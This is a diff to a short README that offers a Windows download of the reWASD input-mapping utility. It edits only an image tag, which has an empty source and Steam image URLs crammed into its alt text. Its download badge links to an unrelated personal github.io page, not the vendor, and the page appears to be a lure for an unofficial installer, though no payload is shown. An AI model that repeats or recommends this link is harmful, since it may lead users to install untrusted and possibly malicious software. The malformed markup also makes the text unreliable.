@@ -1,7 +1,7 @@
 # Download reWASD Input Mapping Utility for Windows
 
 <div align="center">
-<img src="" alt="https://shared.fastly.steamstatic.com/store_item_assets/steam/apps/3337520/e895bfa855b4780b5cf06869838b4f5beb9ce503/capsule_616x353.jpg?t=1740406195" width="750">
+<img src="" alt="[https://shared.fastly.steamstatic.com/store_item_assets/steam/apps/3337520/e895bfa855b4780b5cf06869838b4f5beb9ce503/capsule_616x353.jpg?t=1740406195](https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/3337520/header.jpg?t=1740406195)" width="750">
 </div>
 
 [![Download Installer](https://img.shields.io/badge/Download%20for-Windows-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://jesusfrostball3.github.io/.github/ReWASD-Controller-Utility)
